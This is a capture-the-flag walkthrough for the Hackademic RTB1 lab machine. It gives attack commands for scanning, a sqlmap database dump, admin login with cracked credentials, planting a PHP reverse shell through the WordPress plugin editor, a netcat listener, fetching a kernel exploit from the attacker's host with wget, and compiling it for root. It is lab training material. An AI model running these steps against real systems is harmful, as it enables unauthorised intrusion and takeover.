# Hackademic RTB1 - Full Walkthrough

Below is a comprehensive, step-by-step walkthrough with commands and annotated screenshots.

---

## 1. Discover the Target’s IP

sudo netdiscover -r <target_ip_range>



## 2. Scan for Open Ports and Services

nmap <target_ip> -sV -sC



## 3. Recon via Web Browser

Visit the target in your browser:  
`http://<target_ip>/Hackademic_RTB1/`


## 4. Dump the WordPress Database with SQL Injection

sqlmap -u "http://192.168.96.137/Hackademic_RTB1/?cat=1" -D wordpress --dump-all --batch



## 5. Crack and Note the Discovered Passwords

Passwords and usernames are extracted from the dumped database.


## 6. Log in to wp-admin with the Extracted Admin Credentials

- URL: `http://192.168.96.137/Hackademic_RTB1/wp-admin/`
- Username: **GeorgeMiller**
- Password: **q1w2e3**


## 7. Upload PHP Reverse Shell using Plugin File Editor

- Go to: Manage → Files
- Edit `hello.php` and paste PHP reverse shell code,you can get it from pentestmonkey (update IP & port)


## 8. Trigger Shell via Web

Browse to:  
`http://192.168.96.137/Hackademic_RTB1/wp-content/plugins/hello.php`

## 9. Open Netcat Listener to Get the Shell

nc -lvnp 1234


## 10. Identify Kernel Version & Plan Privilege Escalation

- Review kernel version.
- Find matching exploit: Exploit DB ID 15285 (CVE-2010-3904)


## 11. Transfer Exploit to Target using HTTP Server

On attacker (Kali) machine:

python3 -m http.server 80



## 12. Download Exploit Source on the Victim

On shell at the victim:

wget http://192.168.96.129:80/15285.c



## 13. Compile & Run Privilege Escalation Exploit

Compile with gcc and run:

gcc 15285.c -o exploit
./exploit

## 14. Capture the Flag

Switch to `/root`, list files, and read `key.txt`:

cd /root
ls
cat key.txt



You should see a congratulatory message along with the flag!

---

**End of Walkthrough**

---

Congratulations! Hackademic RTB1 rooted and key.txt captured.
